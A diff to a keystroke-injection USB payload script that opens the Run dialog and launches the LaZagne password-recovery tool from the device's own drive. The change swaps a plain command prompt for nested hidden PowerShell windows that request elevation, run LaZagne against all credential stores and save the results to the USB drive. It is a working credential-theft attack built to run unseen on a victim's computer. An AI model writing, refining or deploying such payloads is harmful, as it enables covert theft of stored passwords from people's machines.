@@ -7,7 +7,8 @@ ATTACKMODE HID STORAGE
 DELAY 1000
 GUI r
 DELAY 200
-STRING cmd /c "D: && LaZange.exe all -vv -quiet -oA -output D:\lazagne_output.txt"
+STRING powershell -WindowStyle Hidden -Command "Start-Process PowerShell -ArgumentList '-WindowStyle Hidden -Command \"Start-Process cmd -ArgumentList ''/c D: && .\\LaZagne.exe all -quiet -oA -output D:\\lazagne_output.txt'' -Verb RunAs\"'"
 ENTER
-DELAY 20000
-STRINGLN exit
+DELAY 30000
+STRING exit
+ENTER
